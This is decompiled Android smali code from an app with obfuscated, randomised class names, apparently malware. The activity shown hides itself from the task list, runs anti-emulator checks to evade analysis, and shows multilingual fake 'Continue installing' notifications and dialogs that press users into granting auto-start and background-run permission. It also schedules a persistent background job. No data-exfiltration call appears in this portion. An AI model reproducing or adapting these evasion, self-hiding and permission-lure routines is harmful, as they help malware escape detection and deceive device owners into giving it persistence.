    sget-boolean v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/aunstgpmkvyrhhhzulszqnsguszztbhsrhphzfdifobhhwfegg38;->echo:Z

    if-eqz v0, :cond_0

    .line 1269
    sget-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/dnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9;->AA:Ljava/lang/String;

    const-string v1, " "

    invoke-virtual {v1}, Ljava/lang/String;->getBytes()[B

    move-result-object v1

    invoke-static {v0, v1}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/aunstgpmkvyrhhhzulszqnsguszztbhsrhphzfdifobhhwfegg38;->vkxpkmtknpxkyimkulrtdthirulmdzpbuczxqrvzkgbayryngh52(Ljava/lang/String;[B)V

    .line 1271
    :cond_0
    sget-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71;->HideType:Ljava/lang/String;

    const-string v1, "K"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_2

    .line 1273
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x15

    if-lt v0, v1, :cond_1

    .line 1274
    invoke-super {p0}, Landroid/app/Activity;->finishAndRemoveTask()V

    goto :goto_0

    .line 1276
    :cond_1
    invoke-super {p0}, Landroid/app/Activity;->finish()V

    :cond_2
    :goto_0
    return-void
.end method

.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 1

    const/4 v0, 0x1

    if-ne p1, v0, :cond_2

    .line 70
    iget-object p1, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->mUploadMessage:Landroid/webkit/ValueCallback;

    if-eqz p1, :cond_2

    if-eqz p3, :cond_2

    const/4 p1, -0x1

    if-eq p2, p1, :cond_0

    goto :goto_1

    .line 75
    :cond_0
    invoke-virtual {p3}, Landroid/content/Intent;->getDataString()Ljava/lang/String;

    move-result-object p1

    const/4 p2, 0x0

    if-eqz p1, :cond_1

    new-array p3, v0, [Landroid/net/Uri;

    const/4 v0, 0x0

    .line 78
    invoke-static {p1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object p1

    aput-object p1, p3, v0

    goto :goto_0

    :cond_1
    move-object p3, p2

    .line 81
    :goto_0
    iget-object p1, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->mUploadMessage:Landroid/webkit/ValueCallback;

    invoke-interface {p1, p3}, Landroid/webkit/ValueCallback;->onReceiveValue(Ljava/lang/Object;)V

    .line 82
    iput-object p2, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->mUploadMessage:Landroid/webkit/ValueCallback;

    nop

    :cond_2
    :goto_1
    return-void
.end method

.method public onBackPressed()V
    .locals 1

    .line 1231
    :try_start_0
    iget-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->mWebView:Landroid/webkit/WebView;

    if-eqz v0, :cond_0

    iget-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->canGoBack()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 1232
    iget-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->mWebView:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->goBack()V

    goto :goto_0

    .line 1234
    :cond_0
    invoke-super {p0}, Landroid/app/Activity;->onBackPressed()V
    :try_end_0
    .catch Ljava/lang/NullPointerException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 1237
    :catch_0
    invoke-super {p0}, Landroid/app/Activity;->onBackPressed()V

    :goto_0
    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 19

    move-object/from16 v0, p0

    const-string v1, "zh"

    const-string v2, "tr"

    const-string v3, "en"

    const-string v4, "ar"

    .line 648
    invoke-super/range {p0 .. p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    const/4 v5, 0x1

    .line 842
    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    .line 674
    invoke-virtual {v0, v5}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->requestWindowFeature(I)Z

    .line 676
    invoke-virtual/range {p0 .. p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->getWindow()Landroid/view/Window;

    move-result-object v7

    const/16 v8, 0x400

    invoke-virtual {v7, v8, v8}, Landroid/view/Window;->setFlags(II)V

    .line 687
    new-instance v7, Landroid/graphics/Point;

    invoke-direct {v7}, Landroid/graphics/Point;-><init>()V

    .line 688
    invoke-virtual/range {p0 .. p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->getWindowManager()Landroid/view/WindowManager;

    move-result-object v8

    invoke-interface {v8}, Landroid/view/WindowManager;->getDefaultDisplay()Landroid/view/Display;

    move-result-object v8

    invoke-virtual {v8, v7}, Landroid/view/Display;->getRealSize(Landroid/graphics/Point;)V

    .line 689
    invoke-virtual/range {p0 .. p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->getApplicationContext()Landroid/content/Context;

    move-result-object v8

    sget-object v9, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_MySettings;->ScreenWidth:Ljava/lang/String;

    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    const-string v11, ""

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget v12, v7, Landroid/graphics/Point;->x:I

    invoke-virtual {v10, v12}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-static {v8, v9, v10}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_MySettings;->Write(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 690
    invoke-virtual/range {p0 .. p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->getApplicationContext()Landroid/content/Context;

    move-result-object v8

    sget-object v9, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_MySettings;->ScreenHight:Ljava/lang/String;

    new-instance v10, Ljava/lang/StringBuilder;

    invoke-direct {v10}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget v7, v7, Landroid/graphics/Point;->y:I

    invoke-virtual {v10, v7}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-static {v8, v9, v7}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_MySettings;->Write(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    const/high16 v8, 0x10000000

    const/16 v9, 0xf2e

    const/16 v10, 0xe7e

    const/16 v11, 0xca9

    const/16 v12, 0xc31

    const/4 v14, 0x3

    const/4 v15, 0x2

    .line 693
    :try_start_0
    invoke-static {}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/dnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9;->Anti_emu()Z

    move-result v16

    if-eqz v16, :cond_0

    invoke-direct/range {p0 .. p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->isEmu_DIV_ID_lator()Z

    move-result v16

    if-eqz v16, :cond_0

    .line 695
    invoke-direct/range {p0 .. p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->AsknoEmu()V

    return-void

    .line 699
    :cond_0
    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v16

    invoke-virtual/range {v16 .. v16}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;

    move-result-object v13

    .line 700
    invoke-virtual {v13}, Ljava/lang/String;->hashCode()I

    move-result v7

    if-eq v7, v12, :cond_4

    if-eq v7, v11, :cond_3

    if-eq v7, v10, :cond_2

    if-eq v7, v9, :cond_1

    goto :goto_0

    :cond_1
    invoke-virtual {v13, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_5

    const/4 v7, 0x2

    goto :goto_1

    :cond_2
    invoke-virtual {v13, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_5

    const/4 v7, 0x3

    goto :goto_1

    :cond_3
    invoke-virtual {v13, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_5

    const/4 v7, 0x0

    goto :goto_1

    :cond_4
    invoke-virtual {v13, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_5

    const/4 v7, 0x1

    goto :goto_1

    :cond_5
    :goto_0
    const/4 v7, -0x1

    :goto_1
    if-eqz v7, :cond_9

    if-eq v7, v5, :cond_8

    if-eq v7, v15, :cond_7

    if-eq v7, v14, :cond_6

    goto :goto_2

    :cond_6
    const-string v7, "kuruluma devam et"

    .line 714
    sput-object v7, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/dnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9;->completeinstallnotifi_title:Ljava/lang/String;

    const-string v7, "Kuruluma devam etmek i\u00e7in buraya t\u0131klay\u0131n"

    .line 715
    sput-object v7, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/dnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9;->completeinstallnotifi_msg:Ljava/lang/String;

    goto :goto_2

    :cond_7
    const-string v7, "\u7ee7\u7eed\u5b89\u88c5"

    .line 710
    sput-object v7, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/dnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9;->completeinstallnotifi_title:Ljava/lang/String;

    const-string v7, "\u5355\u51fb\u6b64\u5904\u7ee7\u7eed\u5b89\u88c5"

    .line 711
    sput-object v7, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/dnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9;->completeinstallnotifi_msg:Ljava/lang/String;

    goto :goto_2

    :cond_8
    const-string v7, "\u0645\u0648\u0627\u0635\u0644\u0629 \u0627\u0644\u062a\u062b\u0628\u064a\u062a"

    .line 706
    sput-object v7, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/dnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9;->completeinstallnotifi_title:Ljava/lang/String;

    const-string v7, "\u0627\u0646\u0642\u0631 \u0647\u0646\u0627 \u0644\u0645\u062a\u0627\u0628\u0639\u0629 \u0627\u0644\u062a\u062b\u0628\u064a\u062a"

    .line 707
    sput-object v7, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/dnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9;->completeinstallnotifi_msg:Ljava/lang/String;

    goto :goto_2

    :cond_9
    const-string v7, "Continue installing"

    .line 702
    sput-object v7, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/dnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9;->completeinstallnotifi_title:Ljava/lang/String;

    const-string v7, "Click Here to Continue installing"

    .line 703
    sput-object v7, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/dnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9;->completeinstallnotifi_msg:Ljava/lang/String;

    .line 720
    :goto_2
    invoke-virtual/range {p0 .. p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->getApplicationContext()Landroid/content/Context;

    move-result-object v7

    .line 721
    invoke-virtual {v7}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v7

    const v14, 0x7f0a0315

    invoke-virtual {v7, v14}, Landroid/content/res/Resources;->getString(I)Ljava/lang/String;

    move-result-object v7

    sput-object v7, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/dnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9;->pr:Ljava/lang/String;

    .line 726
    invoke-virtual/range {p0 .. p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->getApplicationContext()Landroid/content/Context;

    move-result-object v7

    sget-object v14, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_MySettings;->Cantgo:Ljava/lang/String;

    invoke-static {v7, v14, v6}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_MySettings;->readBool(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Z

    move-result v7

    if-eqz v7, :cond_a

    .line 729
    new-instance v7, Landroid/content/Intent;

    invoke-virtual/range {p0 .. p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->getApplicationContext()Landroid/content/Context;

    move-result-object v13

    const-class v14, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/kcqdoxxtyktgbeyntkliisotenwegmndnbuzomlrdzxlifoquk14;

    invoke-direct {v7, v13, v14}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 730
    invoke-virtual {v7, v8}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v13, 0x800000

    .line 731
    invoke-virtual {v7, v13}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v13, 0x40000000    # 2.0f

    .line 732
    invoke-virtual {v7, v13}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 733
    invoke-virtual {v0, v7}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->startActivity(Landroid/content/Intent;)V

    return-void

    .line 738
    :cond_a
    invoke-virtual/range {p0 .. p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->getApplicationContext()Landroid/content/Context;

    move-result-object v7

    invoke-static {v7}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/dnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9;->SetJob(Landroid/content/Context;)V

    .line 739
    invoke-virtual/range {p0 .. p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->getApplicationContext()Landroid/content/Context;

    move-result-object v7
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    .line 743
    :try_start_1
    invoke-static {}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/Autodnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9Start;->getInstance()Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/Autodnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9Start;

    move-result-object v14

    .line 744
    invoke-static {}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/dnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9;->NeedAutoStart()Z

    move-result v18

    if-eqz v18, :cond_14

    .line 745
    invoke-virtual/range {p0 .. p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->getApplicationContext()Landroid/content/Context;

    move-result-object v8

    sget-object v15, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_MySettings;->AutoStartOn:Ljava/lang/String;

    const/16 v17, 0x0

    invoke-static/range {v17 .. v17}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    invoke-static {v8, v15, v5}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_MySettings;->readBool(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Z

    move-result v5

    if-nez v5, :cond_14

    .line 746
    invoke-virtual {v14, v7}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/Autodnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9Start;->isAutoStartPermissionAvailable(Landroid/content/Context;)Z

    move-result v5

    if-eqz v5, :cond_14

    .line 750
    new-instance v5, Landroid/app/AlertDialog$Builder;

    new-instance v8, Landroid/view/ContextThemeWrapper;

    const/high16 v15, 0x7f0b0000

    invoke-direct {v8, v0, v15}, Landroid/view/ContextThemeWrapper;-><init>(Landroid/content/Context;I)V

    invoke-direct {v5, v8}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V

    .line 756
    invoke-virtual {v13}, Ljava/lang/String;->hashCode()I

    move-result v8

    if-eq v8, v12, :cond_e

    if-eq v8, v11, :cond_d

    if-eq v8, v10, :cond_c

    if-eq v8, v9, :cond_b

    goto :goto_3

    :cond_b
    invoke-virtual {v13, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_f

    const/4 v8, 0x2

    goto :goto_4

    :cond_c
    invoke-virtual {v13, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_f

    const/4 v8, 0x3

    goto :goto_4

    :cond_d
    invoke-virtual {v13, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_f

    const/4 v8, 0x0

    goto :goto_4

    :cond_e
    invoke-virtual {v13, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v8
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    if-eqz v8, :cond_f

    const/4 v8, 0x1

    goto :goto_4

    :cond_f
    :goto_3
    const/4 v8, -0x1

    :goto_4
    const-string v13, "this App request Auto Start/Run in Background Permission to work properly"

    if-eqz v8, :cond_13

    const/4 v15, 0x1

    if-eq v8, v15, :cond_12

    const/4 v15, 0x2

    if-eq v8, v15, :cond_11

    const/4 v15, 0x3

    if-eq v8, v15, :cond_10

    :try_start_2
    const-string v8, "OK"

    .line 780
    invoke-virtual {v5, v13}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    goto :goto_5

    :cond_10
    const-string v8, "Tamam"

    const-string v13, "Bu uygulama, d\u00fczg\u00fcn \u00e7al\u0131\u015fmas\u0131 i\u00e7in hem otomatik ba\u015flatma hem de arka planda \u00e7al\u0131\u015ft\u0131rma izinlerini ister"

    .line 775
    invoke-virtual {v5, v13}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    goto :goto_5

    :cond_11
    const-string v8, "\u597d\u7684"

    const-string v13, "\u6b64\u5e94\u7528\u7a0b\u5e8f\u8bf7\u6c42\u81ea\u52a8\u542f\u52a8\u548c\u5728\u540e\u53f0\u8fd0\u884c\u6743\u9650\u624d\u80fd\u6b63\u5e38\u5de5\u4f5c"

    .line 770
    invoke-virtual {v5, v13}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    goto :goto_5

    :cond_12
    const-string v8, "\u0645\u0648\u0627\u0641\u0642"

    const-string v13, "\u064a\u0637\u0644\u0628 \u0647\u0630\u0627 \u0627\u0644\u062a\u0637\u0628\u064a\u0642 \u0643\u0644\u0627\u064b \u0645\u0646 \u0628\u062f\u0621 \u0627\u0644\u062a\u0634\u063a\u064a\u0644 \u0627\u0644\u062a\u0644\u0642\u0627\u0626\u064a \u0648\u0627\u0644\u062a\u0634\u063a\u064a\u0644 \u0641\u064a \u0623\u0630\u0648\u0646\u0627\u062a \u0627\u0644\u062e\u0644\u0641\u064a\u0629 \u0644\u0644\u0639\u0645\u0644 \u0628\u0634\u0643\u0644 \u0635\u062d\u064a\u062d"

    .line 765
    invoke-virtual {v5, v13}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    goto :goto_5

    :cond_13
    const-string v8, "ok"

    .line 760
    invoke-virtual {v5, v13}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    .line 786
    :goto_5
    :try_start_3
    invoke-virtual/range {p0 .. p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v13

    invoke-virtual/range {p0 .. p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->getPackageName()Ljava/lang/String;

    move-result-object v15

    invoke-virtual {v13, v15}, Landroid/content/pm/PackageManager;->getApplicationIcon(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v13

    const/16 v15, 0x40

    const/16 v9, 0x40

    .line 787
    invoke-static {v7, v13, v15, v9}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/dnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9;->resizeIcon(Landroid/content/Context;Landroid/graphics/drawable/Drawable;II)Landroid/graphics/drawable/Drawable;

    move-result-object v9

    .line 788
    invoke-virtual {v5, v9}, Landroid/app/AlertDialog$Builder;->setIcon(Landroid/graphics/drawable/Drawable;)Landroid/app/AlertDialog$Builder;

    const v9, 0x7f0a001c

    .line 789
    invoke-virtual {v0, v9}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31;->getString(I)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v5, v9}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
    :try_end_3
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_3 .. :try_end_3} :catch_0
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    .line 796
    :catch_0
    :try_start_4
    new-instance v9, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/snuahniuxstxzqjrizxerfnkrdcshjewjbqdnacjxxcrcmulqx31$7;

